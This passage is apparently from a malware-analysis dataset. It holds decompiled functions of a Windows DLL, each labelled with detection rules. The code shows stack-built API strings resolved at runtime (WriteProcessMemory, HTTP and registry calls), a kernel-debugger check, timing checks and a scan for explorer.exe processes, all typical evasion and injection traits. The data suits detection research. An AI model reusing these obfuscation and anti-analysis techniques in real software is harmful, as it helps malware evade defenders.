uStack344 = 0;\n    uStack280 = 0x75;\n    uStack279 = 0x73;\n    uStack278 = 0x65;\n    uStack277 = 0x72;\n    uStack276 = 0x33;\n    uStack275 = 0x32;\n    uStack274 = 0x2e;\n    uStack273 = 100;\n    uStack272 = 0x6c;\n    uStack271 = 0x6c;\n    uStack270 = 0;\n    uStack904 = 0x52;\n    uStack903 = 0x65;\n    uStack902 = 0x67;\n    uStack901 = 0x4f;\n    uStack900 = 0x70;\n    uStack899 = 0x65;\n    uStack898 = 0x6e;\n    uStack897 = 0x4b;\n    uStack896 = 0x65;\n    uStack895 = 0x79;\n    uStack894 = 0x45;\n    uStack893 = 0x78;\n    uStack892 = 0x57;\n    uStack891 = 0;\n    uStack1040 = 0x50;\n    uStack1039 = 0x72;\n    uStack1038 = 0x6f;\n    uStack1037 = 99;\n    uStack1036 = 0x65;\n    uStack1035 = 0x73;\n    uStack1034 = 0x73;\n    uStack1033 = 0x33;\n    uStack1032 = 0x32;\n    uStack1031 = 0x46;\n    uStack1030 = 0x69;\n    uStack1029 = 0x72;\n    uStack1028 = 0x73;\n    uStack1027 = 0x74;\n    uStack1026 = 0x57;\n    uStack1025 = 0;\n    uStack928 = 0x47;\n    uStack927 = 0x65;\n    uStack926 = 0x74;\n    uStack925 = 0x53;\n    uStack924 = 0x79;\n    uStack923 = 0x73;\n    uStack922 = 0x74;\n    uStack921 = 0x65;\n    uStack920 = 0x6d;\n    uStack919 = 0x49;\n    uStack918 = 0x6e;\n    uStack917 = 0x66;\n    uStack916 = 0x6f;\n    uStack915 = 0;\n    uStack504 = 0x47;\n    uStack503 = 0x65;\n    uStack502 = 0x74;\n    uStack501 = 0x50;\n    uStack500 = 0x72;\n    uStack499 = 0x6f;\n    uStack498 = 100;\n    uStack497 = 0x75;\n    uStack496 = 99;\n    uStack495 = 0x74;\n    uStack494 = 0x49;\n    uStack493 = 0x6e;\n    uStack492 = 0x66;\n    uStack491 = 0x6f;\n    uStack490 = 0;\n    uStack1136 = 0x49;\n    uStack1135 = 0x6e;\n    uStack1134 = 0x74;\n    uStack1133 = 0x65;\n    uStack1132 = 0x72;\n    uStack1131 = 0x6e;\n    uStack1130 = 0x65;\n    uStack1129 = 0x74;\n    uStack1128 = 0x51;\n    uStack1127 = 0x75;\n    uStack1126 = 0x65;\n    uStack1125 = 0x72;\n    uStack1124 = 0x79;\n    uStack1123 = 0x44;\n    uStack1122 = 0x61;\n    uStack1121 = 0x74;\n    uStack1120 = 0x61;\n    uStack1119 = 0x41;\n    uStack1118 = 0x76;\n    uStack1117 = 0x61;\n    uStack1116 = 0x69;\n    uStack1115 = 0x6c;\n    uStack1114 = 0x61;\n    uStack1113 = 0x62;\n    uStack1112 = 0x6c;\n    uStack1111 = 0x65;\n    uStack1110 = 0;\n    uStack1248 = 0x77;\n    uStack1247 = 0x69;\n    uStack1246 = 0x6e;\n    uStack1245 = 0x69;\n    uStack1244 = 0x6e;\n    uStack1243 = 0x65;\n    uStack1242 = 0x74;\n    uStack1241 = 0x2e;\n    uStack1240 = 100;\n    uStack1239 = 0x6c;\n    uStack1238 = 0x6c;\n    uStack1237 = 0;\n    uStack1160 = 0x46;\n    uStack1159 = 0x69;\n    uStack1158 = 0x6c;\n    uStack1157 = 0x65;\n    uStack1156 = 0x54;\n    uStack1155 = 0x69;\n    uStack1154 = 0x6d;\n    uStack1153 = 0x65;\n    uStack1152 = 0x54;\n    uStack1151 = 0x6f;\n    uStack1150 = 0x53;\n    uStack1149 = 0x79;\n    uStack1148 = 0x73;\n    uStack1147 = 0x74;\n    uStack1146 = 0x65;\n    uStack1145 = 0x6d;\n    uStack1144 = 0x54;\n    uStack1143 = 0x69;\n    uStack1142 = 0x6d;\n    uStack1141 = 0x65;\n    uStack1140 = 0;\n    uStack944 = 0x52;\n    uStack943 = 0x65;\n    uStack942 = 0x67;\n    uStack941 = 0x47;\n    uStack940 = 0x65;\n    uStack939 = 0x74;\n    uStack938 = 0x56;\n    uStack937 = 0x61;\n    uStack936 = 0x6c;\n    uStack935 = 0x75;\n    uStack934 = 0x65;\n    uStack933 = 0x57;\n    uStack932 = 0;\n    uStack376 = 0x47;\n    uStack375 = 0x65;\n    uStack374 = 0x74;\n    uStack373 = 0x56;\n    uStack372 = 0x65;\n    uStack371 = 0x72;\n    uStack370 = 0x73;\n    uStack369 = 0x69;\n    uStack368 = 0x6f;\n    uStack367 = 0x6e;\n    uStack366 = 0x45;\n    uStack365 = 0x78;\n    uStack364 = 0x57;\n    uStack363 = 0;\n    uStack72 = 0x47;\n    uStack71 = 0x65;\n    uStack70 = 0x74;\n    uStack69 = 0x54;\n    uStack68 = 0x69;\n    uStack67 = 0x6d;\n    uStack66 = 0x65;\n    uStack65 = 0x5a;\n    uStack64 = 0x6f;\n    uStack63 = 0x6e;\n    uStack62 = 0x65;\n    uStack61 = 0x49;\n    uStack60 = 0x6e;\n    uStack59 = 0x66;\n    uStack58 = 0x6f;\n    uStack57 = 0x72;\n    uStack56 = 0x6d;\n    uStack55 = 0x61;\n    uStack54 = 0x74;\n    uStack53 = 0x69;\n    uStack52 = 0x6f;\n    uStack51 = 0x6e;\n    uStack50 = 0;\n    uStack688 = 0x47;\n    uStack687 = 0x65;\n    uStack686 = 0x74;\n    uStack685 = 0x53;\n    uStack684 = 0x79;\n    uStack683 = 0x73;\n    uStack682 = 0x74;\n    uStack681 = 0x65;\n    uStack680 = 0x6d;\n    uStack679 = 0x4d;\n    uStack678 = 0x65;\n    uStack677 = 0x74;\n    uStack676 = 0x72;\n    uStack675 = 0x69;\n    uStack674 = 99;\n    uStack673 = 0x73;\n    uStack672 = 0;\n    uStack1264 = 0x6b;\n    uStack1263 = 0x65;\n    uStack1262 = 0x72;\n    uStack1261 = 0x6e;\n    uStack1260 = 0x65;\n    uStack1259 = 0x6c;\n    uStack1258 = 0x33;\n    uStack1257 = 0x32;\n    uStack1256 = 0x2e;\n    uStack1255 = 100;\n    uStack1254 = 0x6c;\n    uStack1253 = 0x6c;\n    uStack1252 = 0;\n    uStack968 = 0x57;\n    uStack967 = 0x69;\n    uStack966 = 100;\n    uStack965 = 0x65;\n    uStack964 = 0x43;\n    uStack963 = 0x68;\n    uStack962 = 0x61;\n    uStack961 = 0x72;\n    uStack960 = 0x54;\n    uStack959 = 0x6f;\n    uStack958 = 0x4d;\n    uStack957 = 0x75;\n    uStack956 = 0x6c;\n    uStack955 = 0x74;\n    uStack954 = 0x69;\n    uStack953 = 0x42;\n    uStack952 = 0x79;\n    uStack951 = 0x74;\n    uStack950 = 0x65;\n    uStack949 = 0;\n    uStack1184 = 0x53;\n    uStack1183 = 0x48;\n    uStack1182 = 0x47;\n    uStack1181 = 0x65;\n    uStack1180 = 0x74;\n    uStack1179 = 0x46;\n    uStack1178 = 0x6f;\n    uStack1177 = 0x6c;\n    uStack1176 = 100;\n    uStack1175 = 0x65;\n    uStack1174 = 0x72;\n    uStack1173 = 0x50;\n    uStack1172 = 0x61;\n    uStack1171 = 0x74;\n    uStack1170 = 0x68;\n    uStack1169 = 0x57;\n    uStack1168 = 0;\n    uStack400 = 0x57;\n    uStack399 = 0x72;\n    uStack398 = 0x69;\n    uStack397 = 0x74;\n    uStack396 = 0x65;\n    uStack395 = 0x50;\n    uStack394 = 0x72;\n    uStack393 = 0x6f;\n    uStack392 = 99;\n    uStack391 = 0x65;\n    uStack390 = 0x73;\n    uStack389 = 0x73;\n    uStack388 = 0x4d;\n    uStack387 = 0x65;\n    uStack386 = 0x6d;\n    uStack385 = 0x6f;\n    uStack384 = 0x72;\n    uStack383 = 0x79;\n    uStack382 = 0;\n    uStack424 = 0x47;\n    uStack423 = 0x65;\n    uStack422 = 0x74;\n    uStack421 = 0x4d;\n    uStack420 = 0x6f;\n    uStack419 = 100;\n    uStack418 = 0x75;\n    uStack417 = 0x6c;\n    uStack416 = 0x65;\n    uStack415 = 0x48;\n    uStack414 = 0x61;\n    uStack413 = 0x6e;\n    uStack412 = 100;\n    uStack411 = 0x6c;\n    uStack410 = 0x65;\n    uStack409 = 0x41;\n    uStack408 = 0;\n    uStack800 = 0x48;\n    uStack799 = 0x74;\n    uStack798 = 0x74;\n    uStack797 = 0x70;\n    uStack796 = 0x51;\n    uStack795 = 0x75;\n    uStack794 = 0x65;\n    uStack793 = 0x72;\n    uStack792 = 0x79;\n    uStack791 = 0x49;\n    uStack790 = 0x6e;\n    uStack789 = 0x66;\n    uStack788 = 0x6f;\n    uStack787 = 0x41;\n    uStack786 = 0;\n    uStack592 = 0x49;\n    uStack591 = 0x6e;\n    uStack590 = 0x74;\n    uStack589 = 0x65;\n    uStack588 = 0x72;\n    uStack587 = 0x6e;\n    uStack586 = 0x65;\n    uStack585 = 0x74;\n    uStack584 = 0x43;\n    uStack583 = 0x6c;\n    uStack582 = 0x6f;\n    uStack581 = 0x73;\n    uStack580 = 0x65;\n    uStack579 = 0x48;\n    uStack578 = 0x61;\n    uStack577 = 0x6e;\n    uStack576 = 100;\n    uStack575 = 0x6c;\n    uStack574 = 0x65;\n    uStack573 = 0;\n    uStack704 = 0x43;\n    uStack703 = 0x68;\n    uStack702 = 0x61;\n    uStack701 = 0x72;\n    uStack700 = 0x54;\n    uStack699 = 0x6f;\n    uStack698 = 0x4f;\n    uStack697 = 0x65;\n    uStack696 = 0x6d;\n    uStack695 = 0x57;\n    uStack694 = 0;\n    uStack184 = 0x49;\n    uStack183 = 0x6e;\n    uStack182 = 0x74;\n    uStack181 = 0x65;\n    uStack180 = 0x72;\n    uStack179 = 0x6e;\n    uStack178 = 0x65;\n    uStack177 = 0x74;\n    uStack176 = 0x43;\n    uStack175 = 0x72;\n    uStack174 = 0x61;\n    uStack173 = 99;\n    uStack172 = 0x6b;\n    uStack171 = 0x55;\n    uStack170 = 0x72;\n    uStack169 = 0x6c;\n    uStack168 = 0x41;\n    uStack167 = 0;\n    uStack1272 = 0x53;\n    uStack1271 = 0x6c;\n    uStack1270 = 0x65;\n    uStack1269 = 0x65;\n    uStack1268 = 0x70;\n    uStack1267 = 0;\n    uStack448 = 0x54;\n    uStack447 = 0x65;\n    uStack446 = 0x72;\n    uStack445 = 0x6d;\n    uStack444 = 0x69;\n    uStack443 = 0x6e;\n    uStack442 = 0x61;\n    uStack441 = 0x74;\n    uStack440 = 0x65;\n    uStack439 = 0x50;\n    uStack438 = 0x72;\n    uStack437 = 0x6f;\n    uStack436 = 99;\n    uStack435 = 0x65;\n    uStack434 = 0x73;\n    uStack433 = 0x73;\n    uStack432 = 0;\n    uStack816 = 0x56;\n    uStack815 = 0x69;\n    uStack814 = 0x72;\n    uStack813 = 0x74;\n    uStack812 = 0x75;\n    uStack811 = 0x61;\n    uStack810 = 0x6c;\n    uStack809 = 0x46;\n    uStack808 = 0x72;\n    uStack807 = 0x65;\n    uStack806 = 0x65;\n    uStack805 = 0;\n    uStack216 = 0x43;\n    uStack215 = 0x72;\n    uStack214 = 0x65;\n    uStack213 = 0x61;\n    uStack212 = 0x74;\n    uStack211 = 0x65;\n    uStack210 = 0x54;\n    uStack209 = 0x6f;\n    uStack208 = 0x6f;\n    uStack207 = 0x6c;\n    uStack206 = 0x68;\n    uStack205 = 0x65;\n    uStack204 = 0x6c;\n    uStack203 = 0x70;\n    uStack202 = 0x33;\n    uStack201 = 0x32;\n    uStack200 = 0x53;\n    uStack199 = 0x6e;\n    uStack198 = 0x61;\n    uStack197 = 0x70;\n    uStack196 = 0x73;\n    uStack195 = 0x68;\n    uStack194 = 0x6f;\n    uStack193 = 0x74;\n    uStack192 = 0;\n    uStack608 = 0x52;\n    uStack607 = 0x65;\n    uStack606 = 0x67;\n    uStack605 = 0x43;\n    uStack604 = 0x72;\n    uStack603 = 0x65;\n    uStack602 = 0x61;\n    uStack601 = 0x74;\n    uStack600 = 0x65;\n    uStack599 = 0x4b;\n    uStack598 = 0x65;\n    uStack597 = 0x79;\n    uStack596 = 0x45;\n    uStack595 = 0x78;\n    uStack594 = 0x57;\n    uStack593 = 0;\n    uStack624 = 0x43;\n    uStack623 = 0x6c;\n    uStack622 = 0x6f;\n    uStack621 = 0x73;\n    uStack620 = 0x65;\n    uStack619 = 0x48;\n    uStack618 = 0x61;\n    uStack617 = 0x6e;\n    uStack616 = 100;\n    uStack615 = 0x6c;\n    uStack614 = 0x65;\n    uStack613 = 0;\n    uStack528 = 0x48;\n    uStack527 = 0x74;\n    uStack526 = 0x74;\n    uStack525 = 0x70;\n    uStack524 = 0x4f;\n    uStack523 = 0x70;\n    uStack522 = 0x65;\n    uStack521 = 0x6e;\n    uStack520 = 0x52;\n    uStack519 = 0x65;\n    uStack518 = 0x71;\n    uStack517 = 0x75;\n    uStack516 = 0x65;\n    uStack515 = 0x73;\n    uStack514 = 0x74;\n    uStack513 = 0x41;\n    uStack512 = 0;\n    uStack736 = 0x51;\n    uStack735 = 0x75;\n    uStack734 = 0x65;\n    uStack733 = 0x72;\n    uStack732 = 0x79;\n    uStack731 = 0x46;\n    uStack730 = 0x75;\n    uStack729 = 0x6c;\n    uStack728 = 0x6c;\n    uStack727 = 0x50;\n    uStack726 = 0x72;\n    uStack725 = 0x6f;\n    uStack724 = 99;\n    uStack723 = 0x65;\n    uStack722 = 0x73;\n    uStack721 = 0x73;\n    uStack720 = 0x49;\n    uStack719 = 0x6d;\n    uStack718 = 0x61;\n    uStack717 = 0x67;\n    uStack716 = 0x65;\n    uStack715 = 0x4e;\n    uStack714 = 0x61;\n    uStack713 = 0x6d;\n    uStack712 = 0x65;\n    uStack711 = 0x57;\n    uStack710 = 0;\n    uStack1192 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1264);\n    uStack832 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1248);\n    uStack824 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack336);\n    uStack912 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack280);\n    uStack224 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1000);\n    *0x18001dff0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack592);\n    *0x18001df30 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack928);\n    *0x18001dfa0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack944);\n    *0x18001df48 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack664);\n    *0x18001def8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack48);\n    *0x18001dfc8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack264);\n    *0x18001dec0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack400);\n    *0x18001df68 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack320);\n    *0x18001df38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack504);\n    *0x18001df98 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack904);\n    *0x18001dfa8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack488);\n    *0x18001df60 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack736);\n    *0x18001def0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack424);\n    *0x18001dee8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack752);\n    *0x18001e028 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack800);\n    *0x18001df10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack648);\n    *0x18001dfc0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack872);\n    *0x18001e008 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack360);\n    *0x18001e010 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack464);\n    *0x18001deb0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack968);\n    *0x18001dfe0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack984);\n    *0x18001dfe8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack1216);\n    *0x18001e020 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack856);\n    *0x18001dea8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1272);\n    *0x18001de80 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack296);\n    *0x18001dee0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1104);\n    *0x18001dfb0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack144);\n    *0x18001df80 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack912, &uStack704);\n    *0x18001deb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1232);\n    *0x18001df58 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack784);\n    *0x18001df20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack248);\n    *0x18001df08 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack816);\n    *0x18001df28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack376);\n    *0x18001e018 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack1136);\n    *0x18001dea0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack768);\n    *0x18001de78 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1040);\n    *0x18001e000 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack1088);\n    *0x18001dec8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1024);\n    *0x18001df50 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack888);\n    *0x18001dfd8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack184);\n    *0x18001df88 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack912, &uStack160);\n    *0x18001ded8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1064);\n    *0x18001de88 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack624);\n    *0x18001de90 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack544);\n    *0x18001dfd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack104);\n    *0x18001df18 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack128);\n    *0x18001df90 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack912, &uStack688);\n    *0x18001ded0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack568);\n    *0x18001df40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack72);\n    *0x18001df70 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack1160);\n    *0x18001df00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack32);\n    *0x18001de70 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack216);\n    *0x18001df78 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack224, &uStack1184);\n    *0x18001dff8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack832, &uStack528);\n    *0x18001de98 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1192, &uStack448);\n    *0x18001dfb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack824, &uStack608);\n    return;\n}\n",
        "token_count": 18099
    },
    "18000625": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuchar fcn.180006250(int64_t arg1, uint *arg2, uchar *arg3, uchar *arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uchar uStack72;\n    \n    uStack72 = 0;\n    iVar2 = arg1 + *(arg1 + 0x3c);\n    if ((*(iVar2 + 4) == 0x14c) || (*(iVar2 + 4) == -0x799c)) {\n        if ((*(iVar2 + 0x16) & 2) == 0) {\n            *arg3 = 0;\n        }\n        else {\n            *arg3 = 1;\n            if ((*(iVar2 + 0x16) & 0x2000) == 0) {\n                *arg4 = 0;\n            }\n            else {\n                *arg4 = 1;\n            }\n            if (*(iVar2 + 0x18) == 0x10b) {\n                *arg2 = 0x20;\n            }\n            else {\n                if (*(iVar2 + 0x18) != 0x20b) {\n                    *arg2 = 0;\n                    return 0;\n                }\n                *arg2 = 0x40;\n            }\n            if ((*(iVar2 + 0x18) != 0x10b) &&\n               (iVar1 = iVar2 + 0x18 + *(iVar2 + 0x14), \n               (arg1 + *(iVar1 + 0xc + (*(iVar2 + 6) - 1) * 0x28) + *(iVar1 + 0x10 + (*(iVar2 + 6) - 1) * 0x28)) - arg1\n               <= *(iVar2 + 0x50))) {\n                uStack72 = 1;\n            }\n        }\n    }\n    return uStack72;\n}\n",
        "token_count": 415
    },
    "18001292": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.180012928(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int64_t iVar8;\n    uchar auStack136 [32];\n    uchar *puStack104;\n    uchar auStack88 [8];\n    uchar auStack80 [8];\n    uint8_t uStack72;\n    uint64_t uStack64;\n    \n    uStack64 = *0x18001b560 ^ auStack136;\n    iVar2 = fcn.18000f074();\n    iVar8 = 0;\n    if (*0x18001d0b0 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        if ((iVar3 == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"MessageBoxW\"),  iVar4 == 0))\n        goto code_r0x000180012b14;\n        *0x18001d0b0 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar4);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetActiveWindow\");\n        *0x18001d0b8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetLastActivePopup\");\n        *0x18001d0c0 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetUserObjectInformationW\");\n        *0x18001d0d0 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        if (*0x18001d0d0 != 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetProcessWindowStation\");\n            *0x18001d0c8 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        }\n    }\n    if ((*0x18001d0c8 == iVar2) || (*0x18001d0d0 == iVar2)) {\ncode_r0x000180012ab0:\n        if (((*0x18001d0b8 != iVar2) &&\n            (((pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(),  pcVar6 != NULL && (iVar8 = (*pcVar6)(),  iVar8 != 0))\n             && (*0x18001d0c0 != iVar2)))) && (pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(),  pcVar6 != NULL)) {\n            iVar8 = (*pcVar6)(iVar8);\n        }\n    }\n    else {\n        pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x18001d0c8);\n        pcVar7 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x18001d0d0);\n        if ((pcVar6 == NULL) || (pcVar7 == NULL)) goto code_r0x000180012ab0;\n        iVar3 = (*pcVar6)();\n        if (iVar3 != 0) {\n            puStack104 = auStack88;\n            iVar1 = (*pcVar7)(iVar3, 1, auStack80);\n            if ((iVar1 != 0) && ((uStack72 & 1) != 0)) goto code_r0x000180012ab0;\n        }\n        arg3._0_4_ = arg3 | 0x200000;\n    }\n    pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x18001d0b0);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(iVar8, arg1, arg2, arg3);\n    }\ncode_r0x000180012b14:\n    fcn.1800116e0(uStack64 ^ auStack136);\n    return;\n}\n",
        "token_count": 935
    },
    "18000648": {
        "rules": [
            "hash data using djb2/7c4211d97aa54a3fa9be92a08fd675ee"
        ],
        "decompiled_code": "\nint64_t fcn.180006480(uint16_t *arg1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puStackX8;\n    int64_t iStack16;\n    \n    iStack16 = 0x1505;\n    puStackX8 = arg1;\n    while( true ) {\n        uVar1 = *puStackX8;\n        puStackX8 = puStackX8 + 1;\n        if (uVar1 == 0) break;\n        iStack16 = iStack16 * 0x21 + uVar1;\n    }\n    return iStack16;\n}\n",
        "token_count": 135
    },
    "18001518": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * fcn.180015188(uint8_t *arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint8_t *puVar3;\n    ulong var_20h;\n    int64_t var_bp_18h;\n    int64_t var_bp_10h;\n    ulong var_bp_8h;\n    \n    fcn.18000b618(&var_20h, 0);\n    if (arg1 == NULL) {\n        puVar2 = fcn.18000c4c4();\n        *puVar2 = 0x16;\n        fcn.18000c45c();\n    }\n    else {\n        if (*(var_bp_18h + 8) == 0) {\n            arg1 = fcn.18000ae20(arg1);\ncode_r0x000180015116:\n            if (var_bp_8h == '\\0') {\n                return arg1;\n            }\n            *(var_bp_10h + 200) = *(var_bp_10h + 200) & 0xfffffffd;\n            return arg1;\n        }\n        while( true ) {\n            uVar1 = *arg1;\n            if (uVar1 == 0) break;\n            if ((*(uVar1 + 0x1d + var_bp_18h) & 4) == 0) {\n                puVar3 = arg1;\n                if (arg2 == uVar1) break;\n            }\n            else {\n                puVar3 = arg1 + 1;\n                if (*puVar3 == 0) goto code_r0x0001800150db;\n                if (arg2 == CONCAT11(uVar1, *puVar3)) goto code_r0x000180015116;\n            }\n            arg1 = puVar3 + 1;\n        }\n        if (arg2 == uVar1) {\n            if (var_bp_8h == '\\0') {\n                return arg1;\n            }\n            *(var_bp_10h + 200) = *(var_bp_10h + 200) & 0xfffffffd;\n            return arg1;\n        }\n    }\ncode_r0x0001800150db:\n    if (var_bp_8h != '\\0') {\n        *(var_bp_10h + 200) = *(var_bp_10h + 200) & 0xfffffffd;\n    }\n    return NULL;\n}\n",
        "token_count": 536
    },
    "1800066d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1800066d0(int64_t arg1, int32_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint auStack584 [2];\n    uint uStack576;\n    uchar auStack540 [540];\n    \n    *arg2 = 0;\n    iVar2 = (**0x18001de70)(2, 0);\n    if (iVar2 != -1) {\n        auStack584[0] = 0x238;\n        iVar1 = (**0x18001de78)(iVar2, auStack584);\n        while (iVar1 != 0) {\n            iVar1 = fcn.1800153fc(auStack540, L\"explorer.exe\");\n            if (iVar1 == 0) {\n                *(arg1 + *arg2 * 4) = uStack576;\n                *arg2 = *arg2 + 1;\n            }\n            iVar1 = (**0x18001de80)(iVar2, auStack584);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "180007b1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180007b10(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    if (arg2 == 0xd8e1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x180006f20, arg3, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar1, 0xffffffff);\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "18000ae3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18000ae3c(ulong arg1)\n\n{\n    ulong arg1_00;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    uint32_t in_stack_ffffffffffffffec;\n    ulong in_stack_fffffffffffffff0;\n    ulong in_stack_fffffffffffffff8;\n    \n    if (*0x18001d0d8 == 0) {\n        arg1_00 = 0x18001c248;\n    }\n    else {\n        arg1_00 = 0;\n    }\n    fcn.18000ed0c(arg1_00, arg1, 0, 10, in_stack_ffffffffffffffec << 0x20, in_stack_fffffffffffffff0, \n                  in_stack_fffffffffffffff8, in_stack_00000000, in_stack_00000008);\n    return;\n}\n",
        "token_count": 186
    },
    "1800139c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
